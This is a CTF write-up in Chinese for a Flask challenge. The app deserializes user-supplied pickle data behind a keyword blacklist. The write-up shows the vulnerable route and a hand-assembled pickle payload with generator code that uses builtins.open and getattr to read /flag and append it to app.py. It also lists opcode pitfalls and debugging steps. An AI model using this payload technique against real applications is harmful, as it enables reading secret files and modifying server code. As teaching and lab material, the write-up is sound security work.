# const_python — pickle 字节级黑名单 + sys.modules 毒化绕过（手写 STACK_GLOBAL 读 /flag 回写 app.py）

赛事：DASCTF（http-ctf2 平台）
日期：2026-09-08
分类：Web / Python 反序列化
难度：medium
Flag：CTF2{d5b0d7f1-f83e-4c65-be60-540c6f032208}

## 题目

Flask 应用。/src 直接回显 app.py 源码。关键路由：

```python
@app.route('/ppicklee', methods=['POST'])
def ppicklee():
    data = request.form['data']
    sys.modules['os'] = "not allowed"
    sys.modules['sys'] = "not allowed"
    pickle_data = base64.b64decode(data)
    for i in {"os","system","eval","setstate","globals","exec","__builtins__","template",
              "render","\\","compile","requests","exit","pickle","class","mro","flask",
              "sys","base","init","config","session"}:
        if i.encode() in pickle_data:
            return i+" waf !!!!!!!"
    pickle.loads(pickle_data)
    return "success pickle"
```

- 无 find_class 限制（可直接 STACK_GLOBAL builtins.open）
- 字节级子串黑名单
- sys.modules['os']/'sys' 毒化 → GLOBAL os.system 抛 "module isn't a module"（_compat_pickle 也会被黑名单拦）
- pickle.loads 返回值被丢弃，flag 需外带

## 利用

词表审计发现漏网词：builtins、open、getattr、read、write。
构造 pickle 程序（等价 Python）：

```python
fw = open('app.py', 'a')          # memo0
f  = open('/flag')                # memo1
bound = getattr(f, 'read')        # memo2
flag = bound()                    # memo3
wbound = getattr(fw, 'write')     # memo4
wbound(flag)
```

为什么 append app.py：写 static/ 需目录存在（远端不存在 → fail pickle），
而 /src 路由就是 `open("app.py").read()`，天然回读通道。debug=False 下
werkzeug 不自动重载，服务不受影响。

生成器核心（exp.py）：

```python
def s(x):
    b = x.encode(); return b'\x8c' + bytes([len(b)]) + b
BI, OPEN, GETATTR = s('builtins'), s('open'), s('getattr')
p  = b'\x80\x04'
p += BI+OPEN+b'\x93' + s(out)+s(m) + b'\x86R\x94'          # m0=fw
p += BI+OPEN+b'\x93' + s(target) + b'\x85R\x94'            # m1=f
p += BI+GETATTR+b'\x93' + b'h\x01' + s('read') + b'\x86R\x94'   # m2=bound
p += b'h\x02' + b')' + b'R\x94'                            # m3=flag（无参调用也要压空元组）
p += BI+GETATTR+b'\x93' + b'h\x00' + s('write') + b'\x86R\x94'  # m4=wbound
p += b'h\x03' + b'\x85R' + b'.'                            # wbound(flag)
```

发送：POST /ppicklee data=<b64>；然后 GET /src 看 tail。

## 手写 pickle 三坑（本次踩过的）

1. `g`（0x67）是协议 0 的 GET，参数是十进制+\n；1 字节取记忆体是 `h`（BINGET）
2. REDUCE 语义：栈[-2] 为 callable、栈[-1] 为 args 元组。getattr 调用的栈序是
   builtins.getattr → f 对象 → 'read' → TUPLE2(0x86) → R。无参调用必须显式压空元组
   `)`（`h\x02)R`），否则 REDUCE 拿到 bound 当 args → truncated / 类型错
3. 中间值一律 MEMOIZE（\x94），后续用 BINGET 引用，避免重复构造

调试方法：本地 pickle.loads 端到端验证 → pickletools._genops 逐 opcode bisect
（dis 在坏 opcode 处会崩，genops 能定位）→ 字节黑名单扫描 → 上远端。

## 验证过程

1. /src 拿全源码，确认 WAF 词表 + sys.modules 毒化 + 返回值丢弃
2. builtins/getattr/open/read/write 不在黑名单
3. 本地 test：写 /etc/hostname 内容成功
4. static/pwn.txt 路线 fail pickle（目录不存在）
5. append app.py 路线 success pickle，GET /src tail 得 flag
